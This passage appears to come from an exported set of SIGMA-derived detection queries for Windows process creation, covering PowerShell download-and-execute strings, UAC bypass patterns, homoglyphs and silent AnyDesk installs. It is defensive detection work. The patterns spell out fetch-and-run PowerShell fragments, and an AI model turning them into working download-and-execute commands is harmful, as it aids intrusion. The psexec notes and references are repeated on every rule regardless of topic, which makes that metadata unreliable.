            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\code.exe\" and ((tgt.process.image.path contains \"\\calc.exe\" or tgt.process.image.path contains \"\\regsvr32.exe\" or tgt.process.image.path contains \"\\rundll32.exe\" or tgt.process.image.path contains \"\\cscript.exe\" or tgt.process.image.path contains \"\\wscript.exe\") or ((tgt.process.image.path contains \"\\powershell.exe\" or tgt.process.image.path contains \"\\pwsh.exe\" or tgt.process.image.path contains \"\\cmd.exe\") and (tgt.process.cmdline contains \"Invoke-Expressions\" or tgt.process.cmdline contains \"IEX\" or tgt.process.cmdline contains \"Invoke-Command\" or tgt.process.cmdline contains \"ICM\" or tgt.process.cmdline contains \"DownloadString\" or tgt.process.cmdline contains \"rundll32\" or tgt.process.cmdline contains \"regsvr32\" or tgt.process.cmdline contains \"wscript\" or tgt.process.cmdline contains \"cscript\")) or (tgt.process.image.path contains \":\\Users\\Public\\\" or tgt.process.image.path contains \":\\Windows\\Temp\\\" or tgt.process.image.path contains \":\\Temp\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1242
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the usage of the \"Squirrel.exe\" to download arbitrary files. This binary is part of multiple Electron based software installations (Slack, Teams, Discord, etc.)\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1218"
            ],
            "name": "Arbitrary File Download Via Squirrel.EXE",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\squirrel.exe\" or tgt.process.image.path contains \"\\update.exe\") and (tgt.process.cmdline contains \" --download \" or tgt.process.cmdline contains \" --update \" or tgt.process.cmdline contains \" --updateRollback=\") and tgt.process.cmdline contains \"http\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1243
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the presence of unicode characters which are homoglyphs, or identical in appearance, to ASCII letter characters.\nThis is used as an obfuscation and masquerading techniques. Only \"perfect\" homoglyphs are included; these are characters that\nare indistinguishable from ASCII characters and thus may make excellent candidates for homoglyph attack characters.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1036",
                "t1036"
            ],
            "name": "Potential Homoglyph Attack Using Lookalike Characters",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"\u0410\" or tgt.process.cmdline contains \"\u0412\" or tgt.process.cmdline contains \"\u0415\" or tgt.process.cmdline contains \"\u041a\" or tgt.process.cmdline contains \"\u041c\" or tgt.process.cmdline contains \"\u041d\" or tgt.process.cmdline contains \"\u041e\" or tgt.process.cmdline contains \"\u0420\" or tgt.process.cmdline contains \"\u0421\" or tgt.process.cmdline contains \"\u0422\" or tgt.process.cmdline contains \"\u0425\" or tgt.process.cmdline contains \"\u0405\" or tgt.process.cmdline contains \"\u0406\" or tgt.process.cmdline contains \"\u0408\" or tgt.process.cmdline contains \"\u04ae\" or tgt.process.cmdline contains \"\u04c0\" or tgt.process.cmdline contains \"\u050c\" or tgt.process.cmdline contains \"\u051a\" or tgt.process.cmdline contains \"\u051c\" or tgt.process.cmdline contains \"\u0391\" or tgt.process.cmdline contains \"\u0392\" or tgt.process.cmdline contains \"\u0395\" or tgt.process.cmdline contains \"\u0396\" or tgt.process.cmdline contains \"\u0397\" or tgt.process.cmdline contains \"\u0399\" or tgt.process.cmdline contains \"\u039a\" or tgt.process.cmdline contains \"\u039c\" or tgt.process.cmdline contains \"\u039d\" or tgt.process.cmdline contains \"\u039f\" or tgt.process.cmdline contains \"\u03a1\" or tgt.process.cmdline contains \"\u03a4\" or tgt.process.cmdline contains \"\u03a5\" or tgt.process.cmdline contains \"\u03a7\") or (tgt.process.cmdline contains \"\u0430\" or tgt.process.cmdline contains \"\u0435\" or tgt.process.cmdline contains \"\u043e\" or tgt.process.cmdline contains \"\u0440\" or tgt.process.cmdline contains \"\u0441\" or tgt.process.cmdline contains \"\u0445\" or tgt.process.cmdline contains \"\u0455\" or tgt.process.cmdline contains \"\u0456\" or tgt.process.cmdline contains \"\u04cf\" or tgt.process.cmdline contains \"\u0458\" or tgt.process.cmdline contains \"\u04bb\" or tgt.process.cmdline contains \"\u0501\" or tgt.process.cmdline contains \"\u051b\" or tgt.process.cmdline contains \"\u051d\" or tgt.process.cmdline contains \"\u03bf\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1244
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious Hangul Word Processor (Hanword) sub processes that could indicate an exploitation",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1566",
                "t1203",
                "t1059"
            ],
            "name": "Suspicious HWP Sub Processes",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (src.process.image.path contains \"\\Hwp.exe\" and tgt.process.image.path contains \"\\gbb.exe\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1245
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects creation of a scheduled task with a GUID like name",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1053"
            ],
            "name": "Suspicious Scheduled Task Name As GUID",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.image.path contains \"\\schtasks.exe\" and tgt.process.cmdline contains \"/Create \") and (tgt.process.cmdline contains \"/TN \\\"{\" or tgt.process.cmdline contains \"/TN '{\" or tgt.process.cmdline contains \"/TN {\") and (tgt.process.cmdline contains \"}\\\"\" or tgt.process.cmdline contains \"}'\" or tgt.process.cmdline contains \"} \")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1246
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "A General detection for sdclt spawning new processes. This could be an indicator of sdclt being used for bypass UAC techniques.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "Sdclt Child Processes",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and src.process.image.path contains \"\\sdclt.exe\")",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1247
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the execution of the \"cloudflared\" binary from a non standard location.\n",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1090"
            ],
            "name": "Cloudflared Portable Execution",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.image.path contains \"\\cloudflared.exe\" and (not (tgt.process.image.path contains \":\\Program Files (x86)\\cloudflared\\\" or tgt.process.image.path contains \":\\Program Files\\cloudflared\\\"))))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1248
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects suspicious PowerShell download patterns that are often used in malicious scripts, stagers or downloaders (make sure that your backend applies the strings case-insensitive)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1059"
            ],
            "name": "Suspicious PowerShell Download and Execute Pattern",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"IEX ((New-Object Net.WebClient).DownloadString\" or tgt.process.cmdline contains \"IEX (New-Object Net.WebClient).DownloadString\" or tgt.process.cmdline contains \"IEX((New-Object Net.WebClient).DownloadString\" or tgt.process.cmdline contains \"IEX(New-Object Net.WebClient).DownloadString\" or tgt.process.cmdline contains \" -command (New-Object System.Net.WebClient).DownloadFile(\" or tgt.process.cmdline contains \" -c (New-Object System.Net.WebClient).DownloadFile(\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1249
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects the pattern of UAC Bypass using NTFS reparse point and wusa.exe DLL hijacking (UACMe 36)",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1548"
            ],
            "name": "UAC Bypass Using NTFS Reparse Point - Process",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and ((tgt.process.cmdline contains \"\\\"C:\\Windows\\system32\\wusa.exe\\\"  /quiet C:\\Users\\\" and tgt.process.cmdline contains \"\\AppData\\Local\\Temp\\update.msu\" and (tgt.process.integrityLevel in (\"High\",\"System\",\"S-1-16-16384\",\"S-1-16-12288\"))) or (src.process.cmdline=\"\\\"C:\\Windows\\system32\\dism.exe\\\" /online /quiet /norestart /add-package /packagepath:\\\"C:\\Windows\\system32\\pe386\\\" /ignorecheck\" and (tgt.process.integrityLevel in (\"High\",\"System\")) and (tgt.process.cmdline contains \"C:\\Users\\\" and tgt.process.cmdline contains \"\\AppData\\Local\\Temp\\\" and tgt.process.cmdline contains \"\\dismhost.exe {\") and tgt.process.image.path contains \"\\DismHost.exe\")))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1250
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects attempts of decoding encoded Gzip archives via PowerShell.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1132"
            ],
            "name": "Gzip Archive Decode Via PowerShell",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"GZipStream\" and tgt.process.cmdline contains \"::Decompress\"))",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1251
    },
    {
        "fields": {
            "actors": [],
            "anomaly_threshold_count": 2,
            "anomaly_threshold_endpoints": 2,
            "columns": "| columns event.time, event.type, site.name, agent.uuid, src.process.storyline.id, src.process.user, src.process.uid, src.process.cmdline, src.ip.address, src.port.number, dst.ip.address, dst.port.number, src.process.parent.cmdline, tgt.process.cmdline",
            "confidence": 2,
            "description": "Detects AnyDesk Remote Desktop silent installation. Which can be used by attackers to gain remote access.",
            "dynamic_query": false,
            "emulation_validation": "",
            "mitre_techniques": [
                "t1219"
            ],
            "name": "Remote Access Tool - AnyDesk Silent Installation",
            "notes": "- To move around freely without attracting too much attention, attackers often use reliable software (one of the favorites is psexec) that looks normal in an enterprise environment.\r\n- Use the following aggregate to easily group by endpoint: `| group array_agg_distinct(dst.ip.address) by endpoint.name, src.process.cmdline`",
            "pub_date": "2023-03-16T08:02:46.204Z",
            "pub_status": "DIST",
            "query": "event.type=\"Process Creation\" and (endpoint.os=\"windows\" and (tgt.process.cmdline contains \"--install\" and tgt.process.cmdline contains \"--start-with-win\" and tgt.process.cmdline contains \"--silent\")) | columns tgt.process.cmdline,src.process.cmdline,tgt.process.image.path",
            "references": "https://theitbros.com/using-psexec-to-run-commands-remotely/, https://redcanary.com/blog/threat-hunting-psexec-lateral-movement/",
            "relevance": 3,
            "run_daily": true,
            "star_rule": false,
            "tags": [
                "From SIGMA"
            ],
            "target_os": [
                1
            ],
            "threats": [],
            "update_date": "2024-11-26T08:03:25.622Z",
            "vulnerabilities": [],
            "weighted_relevance": 1.5
        },
        "model": "qm.query",
        "pk": 1252
    }
]